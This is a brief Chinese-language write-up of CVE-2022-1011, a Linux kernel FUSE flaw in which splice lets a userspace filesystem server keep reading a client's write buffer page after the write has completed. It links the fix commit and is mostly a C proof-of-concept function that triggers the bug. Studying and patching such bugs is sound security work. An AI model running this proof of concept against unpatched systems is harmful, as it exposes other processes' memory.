# CVE-2022-1011
修复链接：https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit?id=0c4bcfdecb1ac0967619ee7ff44871d93c08c909
该漏洞主要是由于漏洞的主要只由于splice的异步的特性，导致可以在用户文件系统进程中（服务端）保留服务请求的进程（客户端）的一段内存。文件系统进程在write关闭后仍然保持着对write源内存页的引用（文件系统进程只有读的权限，个人感觉危害不大:(）。
核心的逻辑如下，当客户端的page放入pipe之后，先向客户端回复fuse的write请求让write结束，这时pipe中仍然保留write的src的page的引用，再write结束之后再读取src的内容。
```c
void fuse_do_write(fd)
{
    fflush(stdout);
    puts("-----------------------");
    puts("[+] start do_write");

    // splice read requset from pipe
    puts("[+] create pipe");
    int pfd[2], ret;
    ret = pipe(pfd);
    if (ret < 0)
        fatal("pipe");
    size_t bufsize = getpagesize() + 0x1000;
    ret = splice(fd, NULL, pfd[1], NULL, bufsize, 0);
    if (ret < 0)
        fatal("splice");

    // 通过splice读取头部；
    struct fuse_in_header in;
    ret = read(pfd[0], &in, sizeof(struct fuse_in_header));
    if (ret < 0)
        fatal("read head");
    fuse_show_req_head(&in);

    puts("[+] send reply finish write");//回复write请求
    struct fuse_write_out outarg;
    outarg.size = 1;
    outarg.padding = 0;
    printf("unique: %d\n", in.unique);
    fuse_send_reply(fd, &outarg, sizeof(outarg), 0, in.unique);

    // 阻塞等待子进程write结束
    int t = 0;
    do
    {
        fflush(stdout);
        puts("[+] input 1 to contine, other to block");
        scanf("%d", &t);
        puts("[+] ...");

    } while (t != 1);

    struct fuse_write_in inarg;
    struct fuse_bufvec bufv;
    ret = read(pfd[0], &inarg, sizeof(struct fuse_write_in));
    if (ret < 0)
        fatal("read write in");

    printf("[+] write in:\n");
    printf("\tfh:\t%lld\n", inarg.fh);
    printf("\toffset:\t%lld\n", inarg.offset);
    printf("\tsize:\t%d\n", inarg.size);
    printf("\twrite_flags:\t%d\n", inarg.write_flags);
    printf("\tlock_owner:\t%llx\n", inarg.lock_owner);
    printf("\tflags:\t%d\n", inarg.flags);
    printf("\tpadding:\t%d\n", inarg.padding);

    ret = read(pfd[0], &bufv, sizeof(bufv)); //客户端write结束以后再读取page
    printf("bufv:\t%s\n", (char *)&bufv);

    puts("[+] end do_write");
    close(pfd[0]);
    close(pfd[1]);
}
```